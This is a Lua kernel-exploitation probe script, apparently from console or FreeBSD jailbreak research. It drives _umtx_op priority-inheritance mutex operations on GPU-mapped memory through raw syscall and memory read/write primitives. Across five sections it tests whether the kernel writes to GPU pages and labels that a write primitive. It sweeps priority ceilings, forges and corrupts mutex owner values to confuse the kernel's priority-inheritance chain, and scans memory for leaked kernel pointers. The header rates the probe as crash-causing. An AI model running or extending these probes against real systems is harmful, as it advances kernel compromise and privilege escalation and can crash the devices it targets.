-- CRASH_CLASS: MODERATE
-- PROBE 116a: UMTX priority inheritance mutex on GPU mmap pages
--
-- Context: _umtx_op(454) MUTEX_LOCK with UMUTEX_PRIO_INHERIT creates kernel
-- umtx_pi objects AND does casuword() / fuword() on the userspace mutex addr.
-- GPU mmap pages are in process VA space but backed by GPU physical memory.
--
-- THE ANGLE:
-- 1. Place a fake umtx_mutex struct in GPU mmap memory
-- 2. Call _umtx_op(MUTEX_LOCK) pointing at it
-- 3. Kernel writes m_owner (our TID) via casuword() into GPU page
-- 4. This confirms kernel can write to GPU-backed pages
-- 5. SET_CEILING modifies m_ceilings[0/1] on the userspace struct
-- 6. MUTEX_UNLOCK reads m_owner and compares — if we corrupt it, kernel
--    follows the PI chain with wrong thread → priority confusion
--
-- FreeBSD umutex struct layout (from sys/umtx.h):
--   +0x00: m_owner (uint32_t) — TID of owner, kernel writes via casuword
--   +0x04: m_flags (uint32_t) — UMUTEX_PRIO_INHERIT=0x04, etc.
--   +0x08: m_ceilings[0] (uint32_t) — priority ceiling
--   +0x0C: m_ceilings[1] (uint32_t) — priority ceiling
--   +0x10: m_rb_lnk (uint32_t) — robust list link
--   +0x14: m_pad (uint32_t)
--   +0x18: m_spare[2] (uint32_t[2])
--
-- UMTX_OP constants:
--   4 = UMTX_OP_MUTEX_TRYLOCK
--   5 = UMTX_OP_MUTEX_LOCK
--   6 = UMTX_OP_MUTEX_UNLOCK
--   7 = UMTX_OP_SET_CEILING
--  17 = UMTX_OP_MUTEX_WAIT
--  18 = UMTX_OP_MUTEX_WAKE
--  22 = UMTX_OP_MUTEX_WAKE2
--
-- Section A: Basic UMTX ops on heap-allocated mutex (baseline)
-- Section B: UMTX ops on GPU mmap mutex (kernel writes to GPU pages!)
-- Section C: PI mutex lifecycle (lock→read owner→unlock→re-check)
-- Section D: SET_CEILING manipulation on GPU pages
-- Section E: Fake owner TID + unlock → kernel PI chain confusion

local TEST_SECTION = TEST_SECTION or "A"

print("=== PROBE 116a: UMTX PI MUTEX ON GPU MMAP ===")
print("Section: " .. TEST_SECTION)
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function fmt_addr(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

local SYS_getpid = 20
local SYS_umtx = 454
local SYS_mmap = 477

local sc_pid = make_syscall(SYS_getpid)
local sc_umtx = make_syscall(SYS_umtx)
local sc_mmap = make_syscall(SYS_mmap)

-- UMTX operations
local UMTX_OP_MUTEX_TRYLOCK = 4
local UMTX_OP_MUTEX_LOCK    = 5
local UMTX_OP_MUTEX_UNLOCK  = 6
local UMTX_OP_SET_CEILING   = 7
local UMTX_OP_MUTEX_WAIT    = 17
local UMTX_OP_MUTEX_WAKE    = 18
local UMTX_OP_MUTEX_WAKE2   = 22

-- UMUTEX flags
local UMUTEX_UNOWNED     = 0
local UMUTEX_CONTESTED   = 0x80000000
local UMUTEX_PRIO_INHERIT = 0x04
local UMUTEX_PRIO_PROTECT = 0x08

local pid = to_num(pcall(function() return sc_pid() end) and sc_pid() or 0)
print("[*] PID: " .. pid)

-- Helper: dump mutex struct
local function dump_mutex(label, addr)
    local owner = safe_rd(addr)
    local flags = safe_rd(addr + 4)
    local ceil0 = safe_rd(addr + 8)
    local ceil1 = safe_rd(addr + 0xC)
    local rblnk = safe_rd(addr + 0x10)
    local pad   = safe_rd(addr + 0x14)
    print(string.format("  [%s] owner=0x%08X flags=0x%08X ceil=[%d,%d] rb=0x%08X pad=0x%08X",
        label, owner or 0, flags or 0, ceil0 or 0, ceil1 or 0, rblnk or 0, pad or 0))
end

-- Helper: GPU mmap allocation
local function gpu_mmap(npages)
    local ok, addr = pcall(function()
        return sc_mmap(uint64(0), uint64(npages * 0x4000), uint64(0x33),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    if ok then
        local h, l = get_hi_lo(addr)
        if h == 0xFFFFFFFF and l == 0xFFFFFFFF then return nil end
        return addr
    end
    return nil
end


-- ======================================================
-- SECTION A: Baseline — UMTX ops on heap-allocated mutex
-- ======================================================
if TEST_SECTION == "A" then
    print("--- SECTION A: UMTX PI baseline on heap mutex ---")
    print("")

    -- A1: Allocate a mutex in heap memory
    local mtx = memory.alloc(0x100)
    for j = 0, 0x1F, 4 do safe_wd(mtx + j, 0) end

    print("[A1] Heap mutex at: " .. fmt_addr(mtx))

    -- Set up as PI mutex (UMUTEX_PRIO_INHERIT)
    safe_wd(mtx + 0, UMUTEX_UNOWNED)       -- m_owner = UNOWNED
    safe_wd(mtx + 4, UMUTEX_PRIO_INHERIT)  -- m_flags = PI
    safe_wd(mtx + 8, 0)                     -- m_ceilings[0]
    safe_wd(mtx + 0xC, 0)                   -- m_ceilings[1]
    dump_mutex("BEFORE", mtx)

    -- A2: TRYLOCK (op 4) — should succeed on unowned mutex
    print("")
    print("[A2] UMTX_OP_MUTEX_TRYLOCK (op 4):")
    local ok1, ret1 = pcall(function()
        return sc_umtx(uint64(mtx), uint64(UMTX_OP_MUTEX_TRYLOCK), uint64(0), uint64(0), uint64(0))
    end)
    print(string.format("  trylock: ok=%s ret=%d", tostring(ok1), ok1 and to_num(ret1) or -999))
    dump_mutex("AFTER trylock", mtx)

    local owner_after = safe_rd(mtx)
    if owner_after and owner_after ~= 0 then
        print(string.format("  *** KERNEL WROTE OWNER: 0x%08X (our TID?) ***", owner_after))
    end

    -- A3: UNLOCK (op 6)
    print("")
    print("[A3] UMTX_OP_MUTEX_UNLOCK (op 6):")
    local ok2, ret2 = pcall(function()
        return sc_umtx(uint64(mtx), uint64(UMTX_OP_MUTEX_UNLOCK), uint64(0), uint64(0), uint64(0))
    end)
    print(string.format("  unlock: ok=%s ret=%d", tostring(ok2), ok2 and to_num(ret2) or -999))
    dump_mutex("AFTER unlock", mtx)

    -- A4: LOCK (op 5) — blocking lock
    print("")
    print("[A4] UMTX_OP_MUTEX_LOCK (op 5):")
    safe_wd(mtx, UMUTEX_UNOWNED)  -- reset owner
    local ok3, ret3 = pcall(function()
        return sc_umtx(uint64(mtx), uint64(UMTX_OP_MUTEX_LOCK), uint64(0), uint64(0), uint64(0))
    end)
    print(string.format("  lock: ok=%s ret=%d", tostring(ok3), ok3 and to_num(ret3) or -999))
    dump_mutex("AFTER lock", mtx)

    -- A5: SET_CEILING (op 7)
    print("")
    print("[A5] UMTX_OP_SET_CEILING (op 7):")
    -- Reset to use PRIO_PROTECT for ceiling test
    safe_wd(mtx, UMUTEX_UNOWNED)
    safe_wd(mtx + 4, UMUTEX_PRIO_PROTECT)
    safe_wd(mtx + 8, 100)  -- initial ceiling
    local old_ceil = memory.alloc(8)
    safe_wd(old_ceil, 0)

    local ok4, ret4 = pcall(function()
        return sc_umtx(uint64(mtx), uint64(UMTX_OP_SET_CEILING),
            uint64(200), uint64(old_ceil), uint64(0))
    end)
    print(string.format("  set_ceiling(200): ok=%s ret=%d old_ceil=%d",
        tostring(ok4), ok4 and to_num(ret4) or -999, safe_rd(old_ceil) or -1))
    dump_mutex("AFTER ceiling", mtx)

    -- A6: Test various flag combinations
    print("")
    print("[A6] Flag combinations:")
    local flag_tests = {
        {0x00, "NORMAL"},
        {0x01, "PSHARED"},
        {0x04, "PRIO_INHERIT"},
        {0x08, "PRIO_PROTECT"},
        {0x0C, "PI+PP"},
        {0x10, "NONCONSISTENT"},
        {0x04 + 0x01, "PI+PSHARED"},
    }
    for _, ft in ipairs(flag_tests) do
        safe_wd(mtx, UMUTEX_UNOWNED)
        safe_wd(mtx + 4, ft[1])
        local ok_t, ret_t = pcall(function()
            return sc_umtx(uint64(mtx), uint64(UMTX_OP_MUTEX_TRYLOCK),
                uint64(0), uint64(0), uint64(0))
        end)
        local rv = ok_t and to_num(ret_t) or -999
        local owner = safe_rd(mtx) or 0
        print(string.format("  flags=0x%02X [%s]: trylock ret=%d owner=0x%08X%s",
            ft[1], ft[2], rv, owner,
            (owner ~= 0 and rv == 0) and " LOCKED" or ""))
        -- Unlock if locked
        if owner ~= 0 then
            pcall(function()
                sc_umtx(uint64(mtx), uint64(UMTX_OP_MUTEX_UNLOCK), uint64(0), uint64(0), uint64(0))
            end)
        end
    end

    -- A7: MUTEX_WAIT with zero timeout (non-blocking)
    print("")
    print("[A7] MUTEX_WAIT (op 17) with zero timeout:")
    safe_wd(mtx, UMUTEX_UNOWNED)
    safe_wd(mtx + 4, UMUTEX_PRIO_INHERIT)
    -- Set up a timespec of 0 for non-blocking
    local ts = memory.alloc(16)
    safe_wd(ts, 0)       -- tv_sec = 0
    safe_wd(ts + 4, 0)
    safe_wd(ts + 8, 0)   -- tv_nsec = 0
    safe_wd(ts + 12, 0)

    local ok5, ret5 = pcall(function()
        return sc_umtx(uint64(mtx), uint64(UMTX_OP_MUTEX_WAIT),
            uint64(0), uint64(ts), uint64(0))
    end)
    print(string.format("  mutex_wait: ok=%s ret=%d", tostring(ok5), ok5 and to_num(ret5) or -999))

    -- A8: MUTEX_WAKE (op 18)
    print("")
    print("[A8] MUTEX_WAKE (op 18):")
    local ok6, ret6 = pcall(function()
        return sc_umtx(uint64(mtx), uint64(UMTX_OP_MUTEX_WAKE),
            uint64(0), uint64(0), uint64(0))
    end)
    print(string.format("  mutex_wake: ok=%s ret=%d", tostring(ok6), ok6 and to_num(ret6) or -999))

    -- A9: MUTEX_WAKE2 (op 22) — protocol-dependent wake
    print("")
    print("[A9] MUTEX_WAKE2 (op 22) with PI flag:")
    safe_wd(mtx + 4, UMUTEX_PRIO_INHERIT)
    local ok7, ret7 = pcall(function()
        return sc_umtx(uint64(mtx), uint64(UMTX_OP_MUTEX_WAKE2),
            uint64(0), uint64(0), uint64(0))
    end)
    print(string.format("  wake2: ok=%s ret=%d", tostring(ok7), ok7 and to_num(ret7) or -999))


-- ======================================================
-- SECTION B: UMTX ops on GPU mmap pages
-- ======================================================
elseif TEST_SECTION == "B" then
    print("--- SECTION B: UMTX PI on GPU mmap pages ---")
    print("")

    -- B1: Allocate GPU mmap region
    local gpu = gpu_mmap(4)
    if not gpu then
        print("[B1] GPU mmap failed!")
        print("=== PROBE 116a COMPLETE ===")
        return
    end
    print("[B1] GPU region at: " .. fmt_addr(gpu))

    -- Zero the first 0x100 bytes
    for j = 0, 0xFC, 4 do safe_wd(gpu + j, 0) end

    -- B2: Set up PI mutex at GPU page start
    local gpu_mtx = gpu
    safe_wd(gpu_mtx + 0, UMUTEX_UNOWNED)
    safe_wd(gpu_mtx + 4, UMUTEX_PRIO_INHERIT)
    safe_wd(gpu_mtx + 8, 0)
    safe_wd(gpu_mtx + 0xC, 0)
    dump_mutex("GPU BEFORE", gpu_mtx)

    -- B3: TRYLOCK on GPU mutex
    print("")
    print("[B3] TRYLOCK on GPU-backed mutex:")
    local ok1, ret1 = pcall(function()
        return sc_umtx(uint64(gpu_mtx), uint64(UMTX_OP_MUTEX_TRYLOCK),
            uint64(0), uint64(0), uint64(0))
    end)
    local rv1 = ok1 and to_num(ret1) or -999
    print(string.format("  trylock: ok=%s ret=%d", tostring(ok1), rv1))
    dump_mutex("GPU AFTER trylock", gpu_mtx)

    local owner = safe_rd(gpu_mtx)
    if owner and owner ~= 0 then
        print(string.format("  *** KERNEL WROTE TO GPU PAGE: owner=0x%08X ***", owner))
        print("  *** THIS IS A KERNEL → GPU PAGE WRITE PRIMITIVE ***")
    end

    -- B4: UNLOCK on GPU mutex
    print("")
    print("[B4] UNLOCK on GPU-backed mutex:")
    local ok2, ret2 = pcall(function()
        return sc_umtx(uint64(gpu_mtx), uint64(UMTX_OP_MUTEX_UNLOCK),
            uint64(0), uint64(0), uint64(0))
    end)
    print(string.format("  unlock: ok=%s ret=%d", tostring(ok2), ok2 and to_num(ret2) or -999))
    dump_mutex("GPU AFTER unlock", gpu_mtx)

    -- B5: LOCK on GPU mutex
    print("")
    print("[B5] LOCK on GPU-backed mutex:")
    safe_wd(gpu_mtx, UMUTEX_UNOWNED)
    local ok3, ret3 = pcall(function()
        return sc_umtx(uint64(gpu_mtx), uint64(UMTX_OP_MUTEX_LOCK),
            uint64(0), uint64(0), uint64(0))
    end)
    print(string.format("  lock: ok=%s ret=%d", tostring(ok3), ok3 and to_num(ret3) or -999))
    dump_mutex("GPU AFTER lock", gpu_mtx)

    -- B6: Multiple mutex structs across GPU pages
    print("")
    print("[B6] Multiple GPU mutexes (stride=0x20):")
    for i = 0, 7 do
        local off = 0x100 + i * 0x20
        local m = gpu + off
        safe_wd(m + 0, UMUTEX_UNOWNED)
        safe_wd(m + 4, UMUTEX_PRIO_INHERIT)
        safe_wd(m + 8, 0)
        safe_wd(m + 0xC, 0)

        local ok, ret = pcall(function()
            return sc_umtx(uint64(m), uint64(UMTX_OP_MUTEX_TRYLOCK),
                uint64(0), uint64(0), uint64(0))
        end)
        local rv = ok and to_num(ret) or -999
        local own = safe_rd(m) or 0
        print(string.format("  mtx[%d] +0x%X: trylock ret=%d owner=0x%08X%s",
            i, off, rv, own, own ~= 0 and " LOCKED" or ""))

        -- Unlock
        if own ~= 0 then
            pcall(function()
                sc_umtx(uint64(m), uint64(UMTX_OP_MUTEX_UNLOCK), uint64(0), uint64(0), uint64(0))
            end)
        end
    end

    -- B7: Test all flag types on GPU
    print("")
    print("[B7] GPU mutex flag sweep:")
    local gpu_mtx2 = gpu + 0x200
    local flags_to_test = {0x00, 0x01, 0x04, 0x05, 0x08, 0x09, 0x0C, 0x10}
    for _, fl in ipairs(flags_to_test) do
        safe_wd(gpu_mtx2 + 0, UMUTEX_UNOWNED)
        safe_wd(gpu_mtx2 + 4, fl)
        safe_wd(gpu_mtx2 + 8, 100)
        safe_wd(gpu_mtx2 + 0xC, 0)

        local ok, ret = pcall(function()
            return sc_umtx(uint64(gpu_mtx2), uint64(UMTX_OP_MUTEX_TRYLOCK),
                uint64(0), uint64(0), uint64(0))
        end)
        local rv = ok and to_num(ret) or -999
        local own = safe_rd(gpu_mtx2) or 0
        print(string.format("  flags=0x%02X: trylock ret=%d owner=0x%08X", fl, rv, own))

        if own ~= 0 then
            pcall(function()
                sc_umtx(uint64(gpu_mtx2), uint64(UMTX_OP_MUTEX_UNLOCK),
                    uint64(0), uint64(0), uint64(0))
            end)
        end
    end


-- ======================================================
-- SECTION C: PI mutex lifecycle — lock→owner→unlock→verify
-- ======================================================
elseif TEST_SECTION == "C" then
    print("--- SECTION C: PI mutex full lifecycle ---")
    print("")

    local gpu = gpu_mmap(4)
    if not gpu then print("[!] GPU mmap failed!") return end

    local mtx = gpu
    print("[C] GPU mutex at: " .. fmt_addr(mtx))

    -- C1: Lock cycle with owner tracking
    print("")
    print("[C1] Lock→owner→unlock cycle (10 rounds):")
    for round = 1, 10 do
        safe_wd(mtx + 0, UMUTEX_UNOWNED)
        safe_wd(mtx + 4, UMUTEX_PRIO_INHERIT)

        local ok, ret = pcall(function()
            return sc_umtx(uint64(mtx), uint64(UMTX_OP_MUTEX_TRYLOCK),
                uint64(0), uint64(0), uint64(0))
        end)
        local rv = ok and to_num(ret) or -999
        local own_pre = safe_rd(mtx) or 0

        -- Unlock
        local ok2, ret2 = pcall(function()
            return sc_umtx(uint64(mtx), uint64(UMTX_OP_MUTEX_UNLOCK),
                uint64(0), uint64(0), uint64(0))
        end)
        local own_post = safe_rd(mtx) or 0

        if round <= 3 or round == 10 then
            print(string.format("  round %d: lock=%d own=0x%08X → unlock=%d own=0x%08X",
                round, rv, own_pre, ok2 and to_num(ret2) or -999, own_post))
        elseif round == 4 then
            print("  ...")
        end
    end

    -- C2: Lock without unlock — then try operations on contested mutex
    print("")
    print("[C2] Lock without unlock (contested state):")
    safe_wd(mtx + 0, UMUTEX_UNOWNED)
    safe_wd(mtx + 4, UMUTEX_PRIO_INHERIT)

    pcall(function()
        sc_umtx(uint64(mtx), uint64(UMTX_OP_MUTEX_TRYLOCK), uint64(0), uint64(0), uint64(0))
    end)
    local own = safe_rd(mtx) or 0
    print(string.format("  locked: owner=0x%08X", own))

    -- Try to lock again (should fail or deadlock — we use trylock)
    local ok_rl, ret_rl = pcall(function()
        return sc_umtx(uint64(mtx), uint64(UMTX_OP_MUTEX_TRYLOCK),
            uint64(0), uint64(0), uint64(0))
    end)
    print(string.format("  re-trylock: ok=%s ret=%d", tostring(ok_rl), ok_rl and to_num(ret_rl) or -999))

    -- WAKE on locked mutex
    local ok_w, ret_w = pcall(function()
        return sc_umtx(uint64(mtx), uint64(UMTX_OP_MUTEX_WAKE), uint64(0), uint64(0), uint64(0))
    end)
    print(string.format("  wake: ok=%s ret=%d", tostring(ok_w), ok_w and to_num(ret_w) or -999))

    -- WAKE2 on locked PI mutex
    local ok_w2, ret_w2 = pcall(function()
        return sc_umtx(uint64(mtx), uint64(UMTX_OP_MUTEX_WAKE2), uint64(0), uint64(0), uint64(0))
    end)
    print(string.format("  wake2: ok=%s ret=%d", tostring(ok_w2), ok_w2 and to_num(ret_w2) or -999))

    -- Cleanup
    pcall(function()
        sc_umtx(uint64(mtx), uint64(UMTX_OP_MUTEX_UNLOCK), uint64(0), uint64(0), uint64(0))
    end)

    -- C3: Dump surrounding memory after PI operations
    print("")
    print("[C3] GPU page dump after PI ops (+0x00 to +0x3F):")
    for off = 0, 0x3C, 4 do
        local v = safe_rd(mtx + off)
        print(string.format("  +0x%02X: 0x%08X", off, v or 0))
    end

    -- C4: Check for kernel pointer residue in surrounding GPU memory
    print("")
    print("[C4] Kernel pointer scan in GPU region:")
    local kptr_count = 0
    for off = 0, 0xFFF, 8 do
        local val = safe_rq(gpu + off)
        if val then
            local vh, vl = get_hi_lo(val)
            if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF then
                print(string.format("  *** KPTR +0x%X: 0x%08X_%08X ***", off, vh, vl))
                kptr_count = kptr_count + 1
            end
        end
    end
    print("[C4] Kernel pointers found: " .. kptr_count)


-- ======================================================
-- SECTION D: SET_CEILING manipulation on GPU pages
-- ======================================================
elseif TEST_SECTION == "D" then
    print("--- SECTION D: SET_CEILING on GPU pages ---")
    print("")

    local gpu = gpu_mmap(4)
    if not gpu then print("[!] GPU mmap failed!") return end
    local mtx = gpu
    print("[D] GPU mutex at: " .. fmt_addr(mtx))

    -- D1: PRIO_PROTECT mutex + set_ceiling
    print("")
    print("[D1] SET_CEILING with PRIO_PROTECT:")
    safe_wd(mtx + 0, UMUTEX_UNOWNED)
    safe_wd(mtx + 4, UMUTEX_PRIO_PROTECT)
    safe_wd(mtx + 8, 50)   -- initial ceiling
    safe_wd(mtx + 0xC, 0)
    dump_mutex("BEFORE", mtx)

    local old_ceil = memory.alloc(8)
    safe_wd(old_ceil, 0)

    local ok1, ret1 = pcall(function()
        return sc_umtx(uint64(mtx), uint64(UMTX_OP_SET_CEILING),
            uint64(100), uint64(old_ceil), uint64(0))
    end)
    print(string.format("  set_ceiling(100): ok=%s ret=%d old=%d",
        tostring(ok1), ok1 and to_num(ret1) or -999, safe_rd(old_ceil) or -1))
    dump_mutex("AFTER", mtx)

    -- D2: Ceiling sweep
    print("")
    print("[D2] Ceiling value sweep:")
    local ceilings = {0, 1, 31, 47, 63, 127, 255, 256, 1000, 0x7FFF, 0xFFFF, 0x7FFFFFFF}
    for _, c in ipairs(ceilings) do
        safe_wd(mtx + 0, UMUTEX_UNOWNED)
        safe_wd(mtx + 4, UMUTEX_PRIO_PROTECT)
        safe_wd(mtx + 8, 50)

        safe_wd(old_ceil, 0xDEAD)
        local ok, ret = pcall(function()
            return sc_umtx(uint64(mtx), uint64(UMTX_OP_SET_CEILING),
                uint64(c), uint64(old_ceil), uint64(0))
        end)
        local rv = ok and to_num(ret) or -999
        local new_c = safe_rd(mtx + 8) or -1
        print(string.format("  ceiling=%d: ret=%d new_ceil=%d", c, rv, new_c))
    end

    -- D3: SET_CEILING on PI mutex (flags=0x04)
    print("")
    print("[D3] SET_CEILING on PI mutex (should fail?):")
    safe_wd(mtx + 0, UMUTEX_UNOWNED)
    safe_wd(mtx + 4, UMUTEX_PRIO_INHERIT)
    safe_wd(mtx + 8, 50)
    local ok3, ret3 = pcall(function()
        return sc_umtx(uint64(mtx), uint64(UMTX_OP_SET_CEILING),
            uint64(200), uint64(old_ceil), uint64(0))
    end)
    print(string.format("  set_ceiling on PI: ok=%s ret=%d", tostring(ok3), ok3 and to_num(ret3) or -999))
    dump_mutex("AFTER PI set_ceiling", mtx)


-- ======================================================
-- SECTION E: Fake owner → unlock → PI chain confusion
-- ======================================================
elseif TEST_SECTION == "E" then
    print("--- SECTION E: Fake owner + unlock PI confusion ---")
    print("")

    local gpu = gpu_mmap(4)
    if not gpu then print("[!] GPU mmap failed!") return end
    local mtx = gpu
    print("[E] GPU mutex at: " .. fmt_addr(mtx))

    -- E1: Set fake owner TID, then unlock
    print("")
    print("[E1] Fake owner → unlock (PI):")
    local fake_owners = {
        pid,                -- our own PID (might match TID on single-thread)
        pid + 1,            -- adjacent TID
        0x00000001,         -- low TID
        0x7FFFFFFF,         -- max positive
        0x80000000,         -- CONTESTED bit only
        pid + 0x80000000,   -- CONTESTED + our PID
        0xDEADBEEF,         -- garbage
        0,                  -- unowned
    }

    for _, fake in ipairs(fake_owners) do
        safe_wd(mtx + 0, fake)
        safe_wd(mtx + 4, UMUTEX_PRIO_INHERIT)
        safe_wd(mtx + 8, 0)
        safe_wd(mtx + 0xC, 0)

        local ok, ret = pcall(function()
            return sc_umtx(uint64(mtx), uint64(UMTX_OP_MUTEX_UNLOCK),
                uint64(0), uint64(0), uint64(0))
        end)
        local rv = ok and to_num(ret) or -999
        local post_own = safe_rd(mtx) or 0
        print(string.format("  fake_owner=0x%08X: unlock ret=%d post_owner=0x%08X%s",
            fake, rv, post_own,
            (rv == 0 and fake ~= 0) and " *** ACCEPTED ***" or ""))
    end

    -- E2: Lock then corrupt owner, then try wake2
    print("")
    print("[E2] Lock → corrupt owner → wake2:")
    safe_wd(mtx + 0, UMUTEX_UNOWNED)
    safe_wd(mtx + 4, UMUTEX_PRIO_INHERIT)

    local ok_l, ret_l = pcall(function()
        return sc_umtx(uint64(mtx), uint64(UMTX_OP_MUTEX_TRYLOCK), uint64(0), uint64(0), uint64(0))
    end)
    local locked_owner = safe_rd(mtx) or 0
    print(string.format("  locked: owner=0x%08X", locked_owner))

    -- Corrupt owner to a different TID
    safe_wd(mtx, locked_owner + 1)
    print(string.format("  corrupted owner to: 0x%08X", (locked_owner + 1)))

    -- Try wake2 with corrupted owner
    local ok_w, ret_w = pcall(function()
        return sc_umtx(uint64(mtx), uint64(UMTX_OP_MUTEX_WAKE2), uint64(0), uint64(0), uint64(0))
    end)
    print(string.format("  wake2 with corrupt owner: ok=%s ret=%d",
        tostring(ok_w), ok_w and to_num(ret_w) or -999))

    -- Try unlock with corrupted owner
    local ok_u, ret_u = pcall(function()
        return sc_umtx(uint64(mtx), uint64(UMTX_OP_MUTEX_UNLOCK), uint64(0), uint64(0), uint64(0))
    end)
    print(string.format("  unlock with corrupt owner: ok=%s ret=%d",
        tostring(ok_u), ok_u and to_num(ret_u) or -999))

    -- E3: Mass lock/corrupt/unlock cycle
    print("")
    print("[E3] Mass lock-corrupt-unlock (20 rounds):")
    local crashes = 0
    for i = 1, 20 do
        safe_wd(mtx + 0, UMUTEX_UNOWNED)
        safe_wd(mtx + 4, UMUTEX_PRIO_INHERIT)

        local ok_lock = pcall(function()
            sc_umtx(uint64(mtx), uint64(UMTX_OP_MUTEX_TRYLOCK), uint64(0), uint64(0), uint64(0))
        end)

        local own = safe_rd(mtx) or 0
        if own ~= 0 then
            -- Corrupt: set contested bit
            safe_wd(mtx, own + 0x80000000)

            local ok_unlock = pcall(function()
                sc_umtx(uint64(mtx), uint64(UMTX_OP_MUTEX_UNLOCK), uint64(0), uint64(0), uint64(0))
            end)
            if not ok_unlock then crashes = crashes + 1 end
        end
    end
    print(string.format("  20 rounds: %d pcall failures", crashes))

    -- E4: Scan GPU region for kernel pointer residue after all the PI ops
    print("")
    print("[E4] Post-PI kernel pointer scan:")
    local kptr_count = 0
    for off = 0, 0x3FFF, 8 do
        local val = safe_rq(gpu + off)
        if val then
            local vh, vl = get_hi_lo(val)
            if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF then
                print(string.format("  *** KPTR +0x%X: 0x%08X_%08X ***", off, vh, vl))
                kptr_count = kptr_count + 1
            end
        end
    end
    print("[E4] Kernel pointers found: " .. kptr_count)

else
    print("Unknown section: " .. TEST_SECTION)
end

print("")
print("=== PROBE 116a COMPLETE ===")
